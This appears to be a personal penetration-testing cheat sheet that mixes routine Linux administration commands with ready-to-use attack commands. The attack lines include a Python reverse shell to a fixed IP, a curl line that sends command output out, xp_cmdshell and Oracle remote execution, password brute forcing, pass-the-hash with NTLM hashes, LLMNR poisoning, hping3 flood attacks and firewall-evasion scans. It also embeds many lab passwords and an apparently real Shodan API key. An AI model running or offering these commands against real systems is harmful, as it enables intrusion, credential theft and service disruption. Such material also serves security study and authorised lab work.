apt-get update && apt-get upgrade

uname -a

 apt-get install linux-headers-$(uname -r)

 dpkg --remove --force-remove-reinstreq package_name

dpkg --force-all -P packagename

/etc/init.d/nessusd start

 rm /var/lib/apt/lists/lock
 rm /var/cache/apt/archives/lock
 rm /var/lib/dpkg/lock

editcap -F pcap input.cap output.pcap
binwalk -e filename


---------------------------------------------------------world writable-----------------------------------
/dev/shm
/tmp

find . -writable

-----------------------------------------------------------sudo-----------------------------------------------
sudo -s
sudo -i
sudo /bin/bash
sudo passwd
sudo -u username

------------------------------------------------------------Capabilities-------------------------------------------
getcap <binary path>
getpcaps <PID>
cat /proc/<PID>/status
cat /proc/1/status | grep -i 'cap'
capsh --decode=<>

capsh --print 

#Removing capabilities
setcap -r <binary>

------------------------------------------------------------list versions of installed programs--------------------------
dpkg -l
rpm -qa 

--------------------------------------------------------------bash-----------------------------------------------
Current PID:
echo $$

Here documents
golu=$(cat <<EOF
Hi,
hello
byee
EOF
)

-----------------------------------------------------------variables--------------------------------
echo ${USER:0:1} (outputs first character of username)

-------------------------------------------------printf----------------------------------------
printf '\101' (octal)

printf '\x41' (hex)

------------------------------------------------Hexadecimal to ascii--------------------------------------
for c in `cat hype_key_hex`; do printf "\x$c"; done;

-------------------------------------------blind-RCE-curl----------------------------------------------
curl http://192.168.0.12/`whoami`
nc -lrvp 80

--------------------------------------php http server----------------------------------------
php -S 127.0.0.1:8000


-------------------------------------Simple ftp server--------------------------------
python3 -m pyftpdlib -w --user=tester --password=testertest@123 -p 21

---------------------------------------http.server-python-------------------------------------
python3 -m http.server 80
python -m SimpleHTTPServer 80 (pss.py)
updog

openvpn --config <config file> --route-metric 101

------------------------------------Wireguard------------------------------------------------------
apt install wireguard

copy the conf file to /etc/wireguard:
/etc/wireguard/phone.conf

wg up <conf_file_name>

-----------------------------------------Network-password-bruteforcing--------------------------------------
SSH:
hydra -l sunny -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.76:22022 -V

hydra -L users_in_team -p 'CHANGEME' ssh://172.16.64.166:2222

hydra -l david -p 'Spring2018' -M ssh_servers.txt ssh

/usr/share/john/password.lst (hydra default pass list)

hydra -l support-web@test.lab -P /usr/share/john/password.lst imap://192.168.101.17


cat /etc/vmware/vmnet8/dhcpd/dhcpd.leases

uniscan -u http://172.16.21.138/ -qweds
----------------------------------mysql----------------------------
systemctl start mysql

mysql -V (for finding version)
mysql -h 10.104.11.198 -u awdmgmt -p
mysql -h 172.16.64.81 -P 13306 -u root -p
mysql -u drupaluser -pPASSWORD -e 'show databases;'
mysql -u 'admin'  writer -p  # writer is db name
desc employees; (describe)

------------------------------------mssql---------------------------
sqsh -S 10.10.10.59 -U sa -P 'GWE3V65#6KFH93@4GWTG2G'

+ Leverage xp_cmdshell to get a shell:

sqsh -S <ip_address> -U sa -P <password>
 
exec sp_configure 'show advanced options', 1
go
reconfigure
go
exec sp_configure 'xp_cmdshell', 1
go
reconfigure
go
xp_cmdshell 'dir C:\'
go



1> EXEC SP_CONFIGURE 'show advanced options', 1
2> go
Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> EXEC SP_CONFIGURE 'xp_cmdshell', 1
2> reconfigure
3> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)


--------------------------------------------------PostgreSQL-----------------------------------
psql -h 10.1.1.89 -U forge

-------------------------------------------------redis--------------------------------------------
key *

get <key>


---------------------------------------------Oracle--------------------------------------
./odat.py all -s 10.10.10.82 -p 1521  -U scott -P tiger

RCE:
./odat.py java -s 10.10.10.82 -p 1521  -U scott -P tiger -d XE --exec 'ping 10.10.14.23' --sysdba

./odat.py dbmsscheduler -s 10.10.10.82 -p 1521  -U scott -P tiger -d XE --exec "C:\windows\system32\ping.exe 10.10.14.23" --sysdba

./odat.py dbmsscheduler -s 10.10.10.82 -p 1521  -U scott -P tiger -d XE --sysdba --exec "C:\Windows\System32\cmd.exe /c C:\windows\temp\reverse.exe"


Read/Write files:
./odat.py utlfile -s 10.10.10.82 -p 1521  -U scott -P tiger -d XE --test-module --sysdba


./odat.py privesc -s 10.10.10.82 -p 1521  -U scott -P tiger -d XE --sysdba --get-privs


sqlplus scott/tiger@10.10.10.82:1521/XE 'as sysdba'

-------------------------------rpcbind-------------------------------

apt-get install nfs-common(for rpcinfo and showmount like commands)

nmap -sT -n -Pn --disable-arp-ping -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.39.219


----------------------------------------masscan------------------------------------------------------------------

masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0

masscan 172.17.80.100 -p1-65535,U:1-65535 --rate 1000 --interface tap0 --router-ip 175.13.80.1

-----------------------NMAP(NetworkMapper)--------------------------------------------
--stylesheet

nmap --script-updatedb

nmap --script-help default

nmap --script=vuln

nmap 192.168.3-5,7.1 (will scan the four addresses 192.168.3.1, 192.168.4.1, 192.168.5.1, and 192.168.7.1)

nmap -sV --version-intensity --allports --version-trace

nmap -O -v <IP> (Finding zombie/idle device. check for IP ID Sequence: Incremental)

nmap -sA <IP> -p 445 (filtered means firewall is present. Unfiltered means no firewall)

nmap --scanflags URG 192.168.1.1

"--script=(*smb-vuln*)"

-p U:53,T:53

--host-timeout 10m

--script-timeout

nmap -sTU --top-ports 200 localhost -v -oG -  (Finding top ports nmap uses)

awk '$2~/tcp$/' /usr/share/nmap/nmap-services | sort -r -k3 | head -n 100 | awk -F '/tcp' '{print $1}' | awk '{print $2}' | tr '\n' ','  (Finding top ports nmap uses)

--resolve-all (Scan all IPs if mutiple ips are resolved from a target domain)

nmap -Pn -sS -p- -T4 -vvv --script discovery -sV --version-all -sC -O --max-retries 2 --open -oN discovery_10.129.254.222.out 10.129.254.222

curl ifconfig.me
curl ifconfig.me2073
curl api.ipify.org
curl wtfismyip.com/json


 while IFS= read -r line; do nmap -Pn -sS -p- -T4 -vvv --script discovery -sV --version-all -sC -O --max-retries 2 --script-args 'shodan-api.outfile=shodan.csv,shodan-api.apikey=e2MGx2dmafP3I64R4kwmrp4kt99bS2dS' -oN discovery_$line.out $line; done < targets
-----------------------------------------------------------Autorecon-----------------------------------
autorecon -vvv <Target> --nmap-append sS

/root/.config/AutoRecon (Config)

------------------------------------------------------------PortKnocking---------------------------------------------------
Knock
apt-get install knockd
Then you simply type: knock [ip] [port]. For example: knock ip 4000 5000 6000
After that you have to scan the network to see if any new port is open.
If you know what port is open you can connect to the port using netcat. The following command would work nc 192.168.1.102 8888. This would then connect to the port.
Nmap/bash
for x in 4000 5000 6000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x server_ip_address; done

---------------------------------------------------------IDS/firewall-evasion-port-scanning--------------------
Fragment
nmap -sS -f <IP>
nmap -sS <IP> -f --mtu <size> (in multiple of 8)
nmap -f -sS <IP> --data-length 100
nmap -f -f -sS <IP> (16 byte fragment)

Decoy
nmap -sS -D <IP1>,<IP2>,<IP3>,ME <target>

Time
nmap -sS <target> -T<1-5> --max-retries 1

Source_Port
nmap -sS --sorce-port 53 <target_IP>

nmap -sA <IP> -p 445 (filtered means firewall is present. Unfiltered means no firewall)

Spoof MAC
nmap --mac-spoof apple -sS <target_IP>  (--mac-spoof apple,0,<MAC>)

--randomize-hosts

--data-length <length>

----------------------------------------------------------hping3----------------------------------------
hping3 -S --scan '80,445,500-550,!525' 192.168.1.1 #synscan(RST+ACK=closed  SYN+ACK=open  no response=Firewall/filtered)
hping3 -2 --scan  1-1000 192.168.1.1 (udp scan)
hping3 -F -P -U --scan 1-1000 192.168.1.1 -V (Xmas scan: open ports do not reply. -F Fin, -P push, -U urgent)
hping3 --scan 1-100 192.168.1.1 (TCP null scan withput any TCP flags set)

---------------------------------------------------hping3 idlescan--------------------------------
hping3 -S -r -p 135 10.50.97.10(watch the ID, if it remains +1, then this is good condidate for zombie)

Here we are checking for port 135 on 10.50.97.5. 10.50.97.10 is our zombie host.
hping3 -S -r -p 135 10.50.97.10(if ID is +1 then port is closed, if +2 then port is open)
hping3 -a 10.50.97.10 -S -p 135 10.50.97.5


--------------------------------------------------hping3 dos attacks------------------------------
hping3 -S -p 80 127.0.0.1 --flood #Syn flood
hping3 -1 127.0.0.1 --flood # ping flood
hping3 -1 --flood 127.0.0.1 -a 127.0.0.1 #SMURF attack similar to ping flood attack(Same source ip as target)
hping3 -S -p 80 127.0.0.1 -a 127.0.0.1 #LAND attack same source and dest ip address
hping3 -S -p 80 Target --flood --rand-source

https://ravi73079.medium.com/attacks-to-be-performed-using-hping3-packet-crafting-98bc25584745
-------------------------------------------------------rustscan---------------------------------------
rustscan -a 10.200.55.200 -- -A -sC -sV -sC

---------------------------------------------------change mac----------------
ifconfig eth0 down
ifconfig eth0 hw ether 22:33:44:55:66:77

------------------------------------promiscous mode-----------------------
ifconfig eth0 promisc

------------------------------------network interface--------------------
ip link set eth1 up

------------------------------------enable ssh on reboot---------------------
update-rc.d ssh enable
service ssh restart


---------------------------------nautilus------------------------------
ctrl+l (show full path of current directory)
---------------------get process id of nautilus-------------------------
ps aux | grep nau

--------------------------------------list processes without ps-----------------
for exe in /proc/*/exe ; do ls -l $exe; done

------------------------killing process by process id--------------------
kill 16476 

-------------------------------------kill paused process------------------------------
kill -kill %1

-------------------------------------------run a process in background------------------
<command>& disown

Resume suspended process(ctrl + z):
bg (this will resume the process in background)

--------------------------------------banner-grabing-http,https/ssl-openssl-----------------------
openssl s_client -connect google.com:443 

nc google.com 80 -v
DNS fwd/rev mismatch: google.com != del03s01-in-f14.1e100.net
google.com [172.217.31.14] 80 (http) open
HEAD / HTTP/1.0

--------------------------------------ssl/tls-----------------------------
openssl s_client -connect www.twitter.com:443 -fallback_scsv -no_tls1_2
The above command is to check for tls scsv fallback. Response of the command should be an error. If connected msg commes then issue


------------------------------------------------savetext-to-multiple-files----------------
echo "hello" | tee /tmp/ssh*

--------------------------------------ssh password from key file-----------------------
ssh2john id_rsa > id_rsa.hash


-----------------------------------------------------writable shadow file----------------------------------------
mkpasswd (for creating new password)
then just paste this to the shadow file

------------------------------------------------------writable passwd file-------------------------------------
openssl passwd "password" (Generating encrypted password) 
Edit the line for user for which you want to change password for. 
Copy the the enc password in the place od "x"

------------------------------------------------------------/etc/passwd-----------------------------------------
cat /etc/passwd | column -t -s ":"

-------------------------------------------------decode base64 file---------------------------------------------
base64 --decode /tmp/encoded.txt > /tmp/decoded.txt


#!/bin/bash
state=$(<base64.txt)
for i in {1..13}; do
   state=$(<<<"$state" base64 --decode)
done
echo "$state"



-------------------------------------------------connect to POP3 via telnet------------------------------------
telnet ip_addr 110 

Login:
USER <username>

PASS <PASSWORD>

listing emails:
LIST

Reading EMAIL:
RETR <ID>  
----------------------------------------------cron jobs-----------------------------------------

Crontabs(Crontabs store configuration of cron jobs) Location:
1. User crontabs
a) /var/spool/cron/
b) /var/spool/cron/crontabs

2. Systemwide crontab
a) /etc/crontab

-----------------------bypassing shell restrictions----------------------------
-----------------------------------------adding a cron service-----------------------------------
crontab -e
@reboot macchanger -m 3C:95:09:9E:B9:3B wlan0

ssh mindy@ip -t "bash --noprofile"


-------------------------------------------------------adding new path to env----------------------------------------------
root@ANONYMOUS:~# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin


export PATH=/tmp/apni:$PATH

source .profile

------------------------------------------chrome as root------------------------------
google-chrome --no-sandbox
chromium --no-sandbox

------------------------------------------on screen navbar----------------------------------
qemu.hw.mainkeys=0

------------------------------------------resetting NW settings in kali------------------------------
service network-manager stop
rm /var/lib/NetworkManager/NetworkManager.state
service network-manager start
nmcli networking off

NetworkManager

-------------------------------finding directories with SUID bit permissions--------------------
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm 0777 2>dev/null
find / -perm -4000 2>/dev/null
find / -user root -perm -4000 2>/dev/null
find / -type f -perm -u=s 2>/dev/null | xargs ls -l

--------------------------------------------------change permissions of directory------------------
umask 077

-----------------------------------------------File attributes---------------------------------
lsattr

---------------------------------------------------man suid privesc-------------------------
man -P "id" man

-----------------------------------------------------------rdp----------------------------------

echo 'yes' | rdesktop 10.10.167.249 -u 'admin' -p 'password'

xfreerdp /u:john /v:192.168.1.100 /p:1qaz2wsx /d:hacking
xfreerdp /u:john /d:hacking /v:192.168.1.100 /pth: <ntlmhash>
xfreerdp /w:800 /h:600 +clipboard /smart-sizing /auto-reconnect /cert-ignore /compression /v:10.11.1.121 /u:sqlServer /p:shantewhite /d:xor.com

 /etc/init.d/xrdp start

cat myfile | grep B | cut -d " " -f 2

-----------------------------------------list listening processes------------------------------
netstat -lntpu | grep LISTEN

netstat -lntup4 | grep -v "127.0.0" | grep "LISTEN"

netstat -a -p --unix | grep docker

netstat -plant
ss -lntup

lsof -i -P -n | grep LISTEN

ss -lntp
ss -twurp

service cron restart 

-----------------------------------------list active connections------------------
netstat -auntp

----------------------------------------------namespaces--------------------------
list namespaces:
lsns

Creating a pid namespace:
unshare --fork --pid --mount-proc bash

------------------------------------------------disable keyring password prompt------------------------------
apt install seahorse -y

--------------------------------uninstalling apps from linux----------------
dpkg --list
apt remove package_name

---------------------------------------------------convert rpm to deb----------------------------------
sudo alien --to-deb oracle-instantclient19.3-basic-???.x???.rpm

-------------------------------------------------gsettings------------------------------------------------
gsettings list-recursively org.gnome.settings-daemon.plugins.power

gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-ac-type nothing (Disables automatic suspend on charging)

gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-battery-type nothing (Disables automatic suspend on battery)

gsettings set org.gnome.settings-daemon.plugins.power power-button-action nothing (Power button does nothing)

gsettings set org.gnome.settings-daemon.plugins.power idle-brightness 0

gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-battery-timeout 0

gsettings set org.gnome.settings-daemon.plugins.power sleep-inactive-ac-timeout 0

------------------------------------------------gnome shortcuts--------------------------------------------
gsettings get org.gnome.settings-daemon.plugins.media-keys custom-keybindings (list custom-keybindings)


gsettings set org.gnome.settings-daemon.plugins.media-keys custom-keybindings "['/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom0/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom1/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom2/']" (Create 3 empty bindings)

gsettings set org.gnome.settings-daemon.plugins.media-keys.custom-keybinding:/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom0/ name 'gnome-terminal'(Setting name of shortcut)

gsettings set org.gnome.settings-daemon.plugins.media-keys.custom-keybinding:/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom0/ command 'gnome-terminal'(Setting command of shortcut)

gsettings set org.gnome.settings-daemon.plugins.media-keys.custom-keybinding:/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom0/ binding '<Alt>c' (Setting the shortcut keys)

DEBIAN_FRONTEND=noninteractive apt install -y kali-desktop-gnome && apt purge --autoremove kali-desktop-xfce && apt purge xfconf xfce4-utils xfwm4 xfce4-session xfdesktop4 exo-utils xfce4-panel xfce4-terminal thunar -y && apt autoremove -y && apt install lightdm -y

-------------------------------------------------------------------nfs---------------------------------------
showmount -e 172.16.80.27

mount -t nfs -o vers=2 <ip>:<remote_folder_absolute_path> <local_folder> -o nolock

mount -t nfs 10.11.1.72:/home /root/Desktop/OSCP/LABS/BETA-10.11.1.72/mnt -o nolock

mount -t nfs 127.0.0.1:/srv/Share ./nfs -o nolock

nmap 172.16.80.27 -Pn -n --disable-arp-ping -p T:2049,111,U:111 -sV --version-intensity 9 --script=nfs-showmount,nfs-ls,nfs-statfs -vvv
cat /etc/exports


--------------------------------------------------------------mount ftp------------------------------------
curlftpfs -o allow_other Anonymous:Anonymous@10.104.108.168 /mnt/Shared/Assignments/MAS-IOT/Private_IPs/second_20/10.104.108.168/ftp_share

------------------------------------------------------------------------smb --------------------------------

impacket-smbserver apnashare $(pwd) -smb2support -user test -password testertest@123

smbmap -H <IP> -u <username> -p <password> -R '<share_name>\<dir_name>' --depth 5 

smbmap -H 192.168.99.162 --download 'WorkSharing\Congratulations.txt'

smbmap -u prtgadmin -p 'PrTg@admin2018' -d netmon -H 10.10.10.152

smbmap -H 10.10.10.192 -d 'BLACKFIELD.local' -u null -p ''

smbmap -H 10.10.10.219 -u lars -p 'G123HHrth234gRG' 

smbmap -H  172.30.111.10 -u null
rpcclient -U "" -N 172.30.111.10
enum4linux -U 10.10.62.151

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.81.226

smbclient -U '%' -N \\\\<IP>\\<SHARE>

smbclient //10.10.81.226/anonymous -N

smbclient -L 10.10.10.52 -U <username>

smbget -R smb://10.10.81.226/anonymous

smb://user@server/share (nautilus)

mount -t smbfs -o username=<your_username>,password=<your_password> //server/share /mountpoint

mount -t cifs -o username=uname,password=password //192.0.0.3/Ethical_Hacking /mnt/Ethical_Hacking

mount -t cifs -o username=null,password=null //10.10.10.237/Software_Updates ./mountme  (mounting null sessions smb)

sleep 20;mount -t cifs -o username=<username>,password=<password> //192.0.0.3/Ethical_Hacking /mnt/Ethical_Hacking

cat /etc/mtab (List all mounted shares)

impacket-psexec admin:a1b2c3d4@10.10.10.20

winexe 

Bruteforce creds:
crackmapexec smb 10.130.40.70 -u '/mnt/Ethical_Hacking/wordlists/SecLists/Usernames/top-usernames-shortlist.txt' -p '/mnt/Ethical_Hacking/wordlists/SecLists/Passwords/Common-Credentials/best15.txt'

scanner/smb/smb_login


Enumerating smb shares:
smbmap -H 172.16.80.22
smbclient -L 172.16.80.27
nmap --script=/usr/share/nmap/scripts/smb-enum-shares.nse 172.16.80.22 -p 445 -n --disable-arp -Pn


Smb enumerating valid users:
for u in $(cat users.txt);do rpcclient -U "" 192.168.13.26 -N --command="lookupnames $u"; done | grep "User: 1"
nmap --script /usr/share/nmap/scripts/smb-enum-users.nse 172.16.80.22 -p 445
enum4linux -r 172.16.80.27


Smb software version detection:
nmap --script /usr/share/nmap/scripts/smb-os-discovery.nse 172.16.80.22 -p 445



Changing password:
smbpasswd -r 10.10.10.193 -U <username>
smbpasswd -r 10.10.10.193 -U bhult


Password policy smb:
enum4linux -P 10.10.10.169
exec smb --pass-pol 10.10.10.169

-------------------------------------------------------crackmapexec-------------------------------------------

crackmapexec {smb,winrm} 192.168.211.0/24 -u fcastle -d MARVEL.local -p Password1 --continue-on-success

crackmapexec {smb,winrm} 192.168.211.0/24 -u fcastle -d MARVEL.local -p Password1 --sam

crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH

crackmapexec smb <target(s)> -u username -H NTHASH

crackmapexec smb 10.10.10.20 -u admin -p a1b2c3d4 -x whoami

crackmapexec smb 10.10.10.149 -u chase -p 'Q4)sJu\Y8qz*A3?d' --rid-brute

--continue-on-success

crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol

Targets:
cme smb 10.11.1.120-123 -u daisy -p XorPasswordIsDead17

-------------------------------------------------------------------pth(pass thw hash)---------------------------------------------
pth-winexe
pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
pth-winexe --system -U 'administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00' //10.10.10.63 cmd.exe

impacket-psexec
------------------------------------------------impacket secretsdump(SAM and SYSTEM)-------------------------------------------------
secretsdump.py -system ./20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -ntds ./20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit local (NTDS.dit and system)

impacket-secretsdump -sam ./Hashes/sam -system ./Hashes/system local


rpcclient-smb:
rpcclient -U <username>%<password> <target-IP>
rpcclient -U support -W blackfield 10.10.10.192
rpcclient -U alice%ThisIsTheUsersPassword01 -W svcorp.com 10.11.1.21

cat ips.txt | while read line do echo $line && rpcclient -U "ELS\SamanthaRivers%P@ssword123" -c "enumdomusers;quit" $line done

>querydominfo
>enumdomusers
>setuserinfo2 audit2020 23 'test@123'  (change password of a AD user)
>setuserinfo2 <usernaem> 23 <New_password>
>srvinfo
>enumalsgroups domain
>enumalsgroups builtin
>getdompwinfo (domain password policy)
>getusrdompwinfo 0x3e8 (user password policy)

Finding SID:
>lookuonames groupname or username

>queryuser 500
------------------------------------------------------llmnr-netbios-poisioning----------------------------
responder -I tap0 -rdwv (turnoff smb and http server in responder conf)

-------------------------------------------------------kerberos-------------------------------

Kerbrute:
/root/go/bin/kerbrute -d fabricorp.local users.txt (golang)

/root/.local/pipx/venvs/kerbrute/bin/kerbrute -domain fabricorp.local -users users.txt -passwords wordlist.txt -dc-ip 10.10.10.193 -outputfile kerbrutefore.out (python3 impacket's)


Time synchronising:
ntpdate <DC IP>

python3 GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 (Finding user accounts which do not require Kerberos preauth)

python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request -format hashcat (Fetching TGT)

-------------------------------------checking ping requests via tcpdump----------------

tcpdump -i tun0 icmp

----------------------------pgrep----------------------
pgrep wisdom-alt

---------------------------------------------gdb---------------------------------
gdb -p 4185

break wisdom-alt.c:100   //sets break point at line 100

----------------------------------------exiftool---------------------------
ExifTool lets you examine ICC profiles, regardless of whether they are embedded in an image or as stand-alone ".icc" files. It also lets you extract ICC profiles from images and embed them into images.

Extract: exiftool -icc_profile -b -w icc photo.jpg
Embed: exiftool "-icc_profile<=profile.icc" photo.jpg
Examine directly in an image: exiftool -icc_profile:* photo.jpg
Examine an ".icc" file: exiftool profile.icc


---------------------------------find and open ------------------------------------
find . -name \*txt | xargs vim -p

----------------cat -------
cat abc.txt | more
cat abc.txt | less
cat -n abc.txt


-----------------------------------------------John------------------------------------- 
cracking ssh private key passphrase:
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash -wordlist=/usr/share/wordlists/rockyou.txt


Zip files:
zip2john file > ../zip.hashes 
john -wordlist=/usr/share/wordlists/rockyou.txt zip.hashes


crack pass via shadow file and passwd file:
1. convert both the files into john readable format via : unshadow passwd shadow > pass.txt
2.john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
---------------------------------downloading/uploading files with ssh-----------------------
scp username@example.com:/backup/file.zip /local/dir
scp -r sean@10.11.1.251:/home/sean/lollz/scans/ ./scans 

Uploading:
scp -r /path/to/local/dir user@remotehost:/path/to/remote/dir

--------------------dumping ssh session---------------------------------------
ssh ctf@138.247.13.114 >>new.txt


-------------------------aircrack-ng----------------------------------------------------
aircrack-ng -w gold_star.txt wytshadow.cap

aircrack-ng -b e8:de:27:57:4f:32 inc0gnito.cap

airdecap-ng -w FF:DE:AD:BE:EF inc0gnito.cap

----------------------------------------------------------------------get png from gifs-------------------------------------------
convert gifwala.gif %02.png

----------------------------------------------------------------------get gif from pngs-------------------------------------------

convert -delay 2 -loop 0 *.png animated.gif

---------------------------------------------------------------------------------find command--------------------------------------
find . -name file 2>/dev/null
find / -type d -name filename  2>/dev/null
find . -type f -name *.py 2>/dev/null
find . -type f -name "*.py" 2>/dev/null
find . -type f -perm 0777 -print 2>/dev/null
find -type f -size +99M -exec ls -lh {} \; 2>/dev/null
find / -group management -ls -exec ls -al {} \; -exec echo {} \; 2>/dev/null

------------------------------------------------------------converting pcapng to pcap---------------------------------------------------
tcpdump -r pehli.pcapng -w pehli_file.pcap


tcpdump -i <> port <port> -vXX -r <file_name.pcap>
---------------------------------------------steghide bruteforce-----------------------------------

for i in $(cat /root/SOTB/sotb_dictionary.txt); do echo '[+] Trying ' $i; steghide extract -sf steg_chall.jpg --passphrase $i; done

--------------------------------------------------------------------cd commands------------------------------
To navigate into the root directory, use "cd /"

To navigate to your home directory, use "cd" or "cd ~"

To navigate up one directory level, use "cd .."

To navigate to the previous directory (or back), use "cd -"


------------------------------------------------------------------run bash with effective userid----------------------------------------
bash -p

---------------------------------------------------------------Restricted bash------------------------------------------
env
printenv

---------------------------------------------------------------------space alternative bash----------------------------------
${IFS%??}


--------------------------------------------------------------Bash Programming--------------------------------------
Reading file line by line:
while IFS= read -r line; do
    echo "http://10.10.10.248/documents/$line-upload.pdf"
done < dates.txt

-----------------------------------------------------------------ssh-tunnel------------------------------------------------------------
ssh -L [Local_port_listening]:[Remote_Machine]:[Remote_Port_to_listen_on] user@ssh_server_ip
ssh -R "[::]:<port_to_open_on_remote_server>:localhost:<service_port>" user@ssh_server_ip

sshpass -p bkVBL8Q9HuBSpj ssh -o StrictHostKeyChecking=no  -L 81:127.0.0.1:81 rijndael@kryptos.htb

sshpass -p $(<password.txt) ssh -o StrictHostKeyChecking=no charix@10.10.10.84

sshpass -p L1k3B1gBut7s@W0rk ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184

sshpass -p 12345678 ssh -R "[::]:80:localhost:80" root@34.87.133.72

echo y | .\plink_x64.exe -pw toor root@10.10.14.8 -P 2222 -R 3306:127.0.0.1:3306


-o KexAlgorithms=
sshpass -p 'bzuisJDnuI6WUDl'  ssh -o StrictHostKeyChecking=no -o KexAlgorithms=diffie-hellman-group-exchange-sha1 j0hn@10.11.1.252 -p 22000

sshuttle -r sean:monkey@10.11.1.251 10.1.1.0/24

------------------------------------------------------------Socat--------------------------------
socat TCP-LISTEN:8888,fork TCP:172.16.40.9:8889

-------------------------------------------------------------------chisel--------------------------------------------------------
Local Port forwarding (exposing ports listening on locahost to remote machine)-
./chisel64 client 10.10.14.23:8001 R:22:127.0.0.1:22

chisel server -p 8001 --reverse

soscks proxy:
client 192.168.119.156:8001 R:socks


---------------------------------------------------------------------generate wordlist from web page-----------------------------------
-a -> metadata
-m -> minimum lenght of word
-d -> depth

cewl -w wordlist.txt -d 10 -a -m 5 http://10.10.10.188/author.html

cewl -w wordlist.txt -d 10 -a -m 8 --with-

---------------------------------------------------------------------fuzzing requests-------------------------------------------------
wfuzz -w wordlist.txt -H "HOST: FUZZ.htb" -u http://10.10.10.188/ --hc 400 --hh 8193

-------------------------------------------------------pipx-------------------------------------------------
 pipx install git-dumper --pip-args '--trusted-host files.pythonhosted.org --trusted-host pypi.org --trusted-host pypi.python.org --trusted-host github.com'

--------------------------------------------------------------python library hacking----------------------------------------------------
 PYTHONPATH=~/fakelib /opt/scripts/admin_tasks.sh

---------------------------------------------------------------------------python3 reverse shell----------------------------------------


python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.64.10",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

Run bas64 encoded payload:
python -c 'import base64;exec(base64.b64decode("IApkZWYgaGVsbG8oKToKICAgICBwcmludCAnaGVsbG8gd29ybGQhJwpoZWxsbygpIA=="));'

--------------------------------------------------------------------tty/stable-------------------------------------------
python -c 'import pty; pty.spawn("/bin/bash")' #interactive shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

stty raw -echo # tab completion



--------------------------------------------------------------adding before text---------------------------------------------------
sed -i '1itask goes here' todo.txt




---------------------------------------------------------------------------tar-------------------------------------------------------
To compress

tar -zcvf archive_name.tar.gz folder_to_compress
To extract

tar -zxvf archive_name.tar.gz

zcat db.sql.gz  #use this to extact partial coppupted file
-------------------------------------------------------------------------7z-------------------------------------------------------------

Listing files in .vhd file

7z l 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd 


Extracting only specific file from .vhd file

7z x 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd  -o'../../../../SAM_and_SYSTEM/' Windows/System32/config/SAM

----------------------------------------------------fix corrupted files-------------------------------
gz:
.\fixgz.exe .\db.sql.gz db.sql.gz_fixed.gz

-------------------------------------------------------------------------------------ip address without ifconfig-------------------------
netstat -ie
ip a
hostname -i
/proc/net/fib_trie

------------------------------------------------unabel to run binary -----------------------------
ldd /usr/local/bin/i686-elf-gcc

-------------------------------------------------enumerate linux binay-------------------------------------

file <binay_name>
ltrace <binay_name>
strace <binary>

View exit code of previously ran program:
echo $?

-------------------------------------------------------------Compile x86 c code in x64 system----------------------------------------
gcc -m32 -o <compiled> <program.c> -Wall

gcc -fPIC (for static memory addresses for shared libraries)
 

-----------------------------------------------------------finding if a program is using shared libraries----------------------------------
ldd /usr/bin/apache2 

------------------------------------------hashcat----------------------------------
hashcat --example-hashes | grep NTLM -B 3
hashcat --example-hashes | grep -i mysql -B 3 -A 2

hashcat -m 5600 ntlmhash.txt /mnt/hgfs/D/wordlists/rockyou.txt --force (ntlmv2 responder hashes)

hashcat --user -m 3200 ./hash.txt /usr/share/wordlists/rockyou.txt --force (if hash is stored in user:hash format)

hashcat -r /usr/share/hashcat/rules/best64.rule --stdout custom.list

Cracking zip password:


Search-that-hash:


---------------------------------------------------live_host_detection/host_discovery-------------------------------
ARP:
nmap -PR 172.16.5.101/24 -n -sn -v -oG - | awk '/Up$/{print $2}'
./nmap32  -PR 10.1.1.246/24 -n -sn -v -T5 -oG - | awk '/Up$/{print $2}'
arp-scan -l  --interface tap0
scanner/discovery/arp_sweep

ICMP echo:
fping -a -g 10.142.111.240/24 2>/dev/null
fping -a -g 10.142.111.240/24 -A -q
nmap -sn 10.142.111.240/24 --disable-arp-ping --send-ip
netdiscover -i eth0
nmap 192.168.211.129/24 -sn
nmap 10.50.96.0/23 -Pn --top-ports=10 -T5 -n --open --source-port 53
nmap 10.50.96.0/23 -Pn --top-ports=10 -T5 -n --open -vvv --source-port 53 --disable-arp-ping
